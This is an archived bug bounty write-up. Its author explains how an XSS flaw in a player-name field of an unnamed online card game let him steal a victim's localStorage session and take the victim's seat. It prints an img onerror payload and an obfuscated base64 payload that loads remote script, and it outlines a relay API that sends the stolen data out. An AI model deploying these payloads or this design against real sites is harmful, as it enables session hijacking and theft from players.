# How I Stole a Player Spot with Simple XSS

- **Source URL:** https://medium.com/@ali_guell/how-i-stole-a-player-spot-with-simple-xss-6a8fa2776a84?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240913224304/https://medium.com/@ali_guell/how-i-stole-a-player-spot-with-simple-xss-6a8fa2776a84
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7239 (id 7239)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Stole a Player Spot with Simple XSS

Hey everyone! I’m **Ali Guellouma**, a [bug bounty hunter](https://hackerone.com/black_wheatear/badges?type=user) from Algeria, and today I want to share an interesting exploit . In this write-up, I’ll walk you through how I used a simple XSS vulnerability to do something cool : take over a player’s spot from spectator mode in an online game.

Before I start after I found the XSS, I inform the developer about it, but since he doesn’t close the main cause, I will call this game TarGetGame.

A little information about TargetGame TargetGame is a card game like Uno with 2–10 players on each match, If the match starts you can’t join until the game ends, but you can watch as spectator (the game use websockets ).

now let us move to the **XSS ,** Will tbh, it was very simple. i just injected a simple img `<img src=x onerror=alert("wiw")>`payload on the player name and I got the alert but the xss does not work with script tag .

The game uses localStorage to identify the users and also to make sure if the user has any issues he can reconnect. so **the exploit scenario will be clear for now**. We just need to steal the LocalStorage data and give it to the attacker, but we also need to force the victim to go out of the game.

To do that, we need two parts an API that forwards the stolen data to the attacker, and a JS code that will send the data, but we have a small problem for now we can only inject img tag how can we inject the JS code? will The answer was on [https://xsshunter.trufflesecurity.com/app.](https://xsshunter.trufflesecurity.com/app.) There was an img payload, so i just used the same method, and it worked with me.

`<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanNjb2RldXJsLmpzP3YiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`
Let’s start with the API: it was a simple API made using Flask that has two endpoints, SenData and Delete.

SenData: will receive the data from the victim and wait intel the attacker get the data if the attacker take the data , it will return a `delete` msg to inform that the attacker have the data

Delete: will return `wait` if there is no stolen data; if there is stolen data, will return the data and inform SenData that the attacker took the data.

Now let’s move to the fun part the JS code:

The js code has two functions, SendData && SetData.

SendData runs on the victim browser, and SetData runs on the attacker browser. To identify the victim, we just need to read the name from the LocalStorage but how we identify the attacker? Will I just set a special cookie that has a key as cookie name then i check which one of the players has that cookie\_key if there is any one has that cookie SetData will start .

Both functions will run every 1s SendData will make ajax request to the API with the base64 of the LocalStorage object every 1s, and if the API returns a `delete` msg it will empty the LocalStorage and reload the page.

SetData will make a simple get request to the API every 1s , if the API returns any theng that is not `wait`msg SetData will decode the data and set the localStorage with the victim localStorage object and reload the page. After this part, the attacker will be on the spot of the victim and can play instead of him.

I uploaded both api.py and attack.js on a pythonanywhere server and tried it with my friend, and it worked. I took my friend’s spot. I really want to record a demo, but this game is very fun to play, so i will avoid killing the joy of the game.

I hope you learned something new and enjoyed reading about my experience! Since this is my first write-up, I apologize if anything was unclear or a bit boring. Feel free to leave feedback, and I’ll do my best to improve in the future
